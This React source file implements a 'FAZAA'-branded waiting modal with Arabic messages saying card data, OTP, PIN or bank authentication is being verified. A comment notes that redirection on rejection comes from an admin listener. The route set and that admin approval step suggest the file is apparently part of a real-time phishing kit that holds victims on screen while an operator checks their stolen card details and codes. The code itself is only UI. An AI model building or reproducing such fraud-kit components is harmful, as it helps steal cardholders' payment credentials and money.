/* FAZAA Waiting Modal — Studio slideshow, 4 images per page, 3s interval */
import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';

// 4 studio images per page
const PAGE_SLIDES: Record<string, string[]> = {
  '/card-payment': [
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_card_payment-7vbi2FcpMZqkeuz6iFsKak.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_card_2-hXu3U9uofqPjwCHM6n9sn9.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_card_3-nyJsnzpFFmhp2JGwrF6ig9.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_card_4-jCZ8GsN7rrtKnXFde8Tj7F.webp',
  ],
  '/otp-verify': [
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_otp-WAx9EK85HRyXgGDzPnP4A6.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_otp_2-iUTHz4V9vhMCCPD3GarSBY.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_otp_3-LauiXKcjtrkKYZgYYJujfH.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_otp_4-8qkXgPme4g2MLyrz28bVXy.webp',
  ],
  '/pin-verify': [
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_pin-NZagAdYEXptdfER9uVYAPG.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_pin_2-YwS5rLpbdNmDiLosPuLWA3.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_pin_3-YjCb9iQWwuFXxdVcqfagus.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_pin_4-bsj2J3tg49bUVVrd4hWkdb.webp',
  ],
  '/bank-auth': [
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_bank_auth-Utxy4HistCUE2VVnNG8PyF.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_bank_2-YdxokUtV6fA5npp8jeumns.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_bank_3-3tUy9bUY6AfDEc55YJNeoy.webp',
    'https://d2xsxph8kpxj0f.cloudfront.net/310519663719160571/9fMf9uryBcTwSVPwBghgyQ/waiting_bank_4-gX6vMVbuFGDJGNoGuxdJgD.webp',
  ],
};

const PAGE_TITLES: Record<string, string> = {
  '/card-payment': 'جارٍ التحقق من بيانات البطاقة',
  '/otp-verify':   'جارٍ التحقق من رمز OTP',
  '/pin-verify':   'جارٍ التحقق من رمز PIN',
  '/bank-auth':    'جارٍ التحقق من المصادقة البنكية',
};

// Fallback slides
const DEFAULT_SLIDES = PAGE_SLIDES['/card-payment'];

export default function WaitingModal() {
  const [location] = useLocation();

  const slides = PAGE_SLIDES[location] || DEFAULT_SLIDES;
  const currentTitle = PAGE_TITLES[location] || 'يتم معالجة طلبك الآن';

  // Slideshow state
  const [activeIdx, setActiveIdx] = useState(0);
  const [fading, setFading] = useState(false);

  // Reset slideshow on page change
  useEffect(() => {
    setActiveIdx(0);
  }, [location]);

  // Auto-advance every 3 seconds with fade transition
  useEffect(() => {
    const timer = setInterval(() => {
      setFading(true);
      setTimeout(() => {
        setActiveIdx(prev => (prev + 1) % slides.length);
        setFading(false);
      }, 400);
    }, 3000);
    return () => clearInterval(timer);
  }, [slides.length]);
  // ملاحظة: التوجيه عند الرفض يتم عبر AdminRedirectListener في App.tsx مباشرةً

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center"
      style={{ background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)' }}
    >
      <div
        className="relative mx-4 rounded-3xl overflow-hidden"
        style={{
          background: 'linear-gradient(160deg, #111111 0%, #1C1C1C 100%)',
          border: '1px solid rgba(200,160,58,0.3)',
          boxShadow: '0 40px 100px rgba(0,0,0,0.75), 0 0 0 1px rgba(200,160,58,0.07), inset 0 1px 0 rgba(255,255,255,0.04)',
          maxWidth: '360px',
          width: '100%',
        }}
      >
        {/* Top gold line */}
        <div className="absolute top-0 left-0 right-0 h-px z-10"
          style={{ background: 'linear-gradient(90deg, transparent 0%, #C8A03A 50%, transparent 100%)' }} />

        {/* Slideshow image */}
        <div className="relative w-full overflow-hidden" style={{ height: '240px' }}>
          <img
            key={activeIdx}
            src={slides[activeIdx]}
            alt="FAZAA"
            className="w-full h-full object-cover"
            style={{
              objectPosition: 'center top',
              transition: 'opacity 0.4s ease-in-out',
              opacity: fading ? 0 : 1,
            }}
          />
          {/* Bottom gradient overlay */}
          <div className="absolute inset-x-0 bottom-0 h-20"
            style={{ background: 'linear-gradient(to bottom, transparent, #1C1C1C)' }} />

          {/* Dot indicators */}
          <div className="absolute bottom-3 left-0 right-0 flex justify-center gap-1.5 z-10">
            {slides.map((_, i) => (
              <div
                key={i}
                style={{
                  width: i === activeIdx ? 18 : 6,
                  height: 6,
                  borderRadius: 3,
                  background: i === activeIdx ? '#C8A03A' : 'rgba(200,160,58,0.3)',
                  transition: 'all 0.3s ease',
                }}
              />
            ))}
          </div>
        </div>

        {/* Content */}
        <div className="px-6 pb-7 pt-3 text-center">

          {/* Spinner ring */}
          <div className="flex justify-center mb-3">
            <div className="relative w-12 h-12">
              <svg className="absolute inset-0 w-12 h-12"
                style={{ animation: 'spin-slow 2.5s linear infinite' }}
                viewBox="0 0 48 48">
                <circle cx="24" cy="24" r="21" fill="none" stroke="rgba(200,160,58,0.1)" strokeWidth="2.5" />
                <circle cx="24" cy="24" r="21" fill="none"
                  stroke="url(#goldGrad)" strokeWidth="2.5"
                  strokeLinecap="round" strokeDasharray="35 97" />
                <defs>
                  <linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="0%">
                    <stop offset="0%" stopColor="#C8A03A" stopOpacity="0" />
                    <stop offset="100%" stopColor="#C8A03A" stopOpacity="1" />
                  </linearGradient>
                </defs>
              </svg>
              <div className="absolute inset-0 m-1.5 rounded-full flex items-center justify-center"
                style={{
                  background: 'linear-gradient(135deg, rgba(200,160,58,0.18), rgba(169,130,29,0.06))',
                  animation: 'pulse-glow 2s ease-in-out infinite',
                }}>
                <span className="text-base font-black"
                  style={{ color: '#C8A03A', fontFamily: 'Cairo, sans-serif', textShadow: '0 0 14px rgba(200,160,58,0.6)' }}>
                  ف
                </span>
              </div>
            </div>
          </div>

          {/* Main text */}
          <h3 className="text-base font-black mb-1"
            style={{ color: '#FFFFFF', fontFamily: 'Cairo, sans-serif' }}>
            شكراً لانتظارك
          </h3>
          <p className="text-xs mb-4"
            style={{ color: 'rgba(255,255,255,0.45)', fontFamily: 'Cairo, sans-serif', lineHeight: '1.7' }}>
            {currentTitle}
          </p>

          {/* Progress bar */}
          <div className="rounded-full overflow-hidden"
            style={{ background: 'rgba(255,255,255,0.05)', height: '3px' }}>
            <div className="h-full rounded-full"
              style={{
                background: 'linear-gradient(90deg, #C8A03A, #F0C84A, #C8A03A)',
                backgroundSize: '200% 100%',
                animation: 'shimmer 1.8s ease-in-out infinite',
              }} />
          </div>
        </div>

        {/* Bottom gold line */}
        <div className="absolute bottom-0 left-0 right-0 h-px"
          style={{ background: 'linear-gradient(90deg, transparent 0%, rgba(200,160,58,0.3) 50%, transparent 100%)' }} />
      </div>

      <style>{`
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to   { transform: rotate(360deg); }
        }
        @keyframes pulse-glow {
          0%, 100% { opacity: 1; transform: scale(1); }
          50%       { opacity: 0.7; transform: scale(0.93); }
        }
        @keyframes shimmer {
          0%   { background-position: 200% 0; }
          100% { background-position: -200% 0; }
        }
      `}</style>
    </div>
  );
}
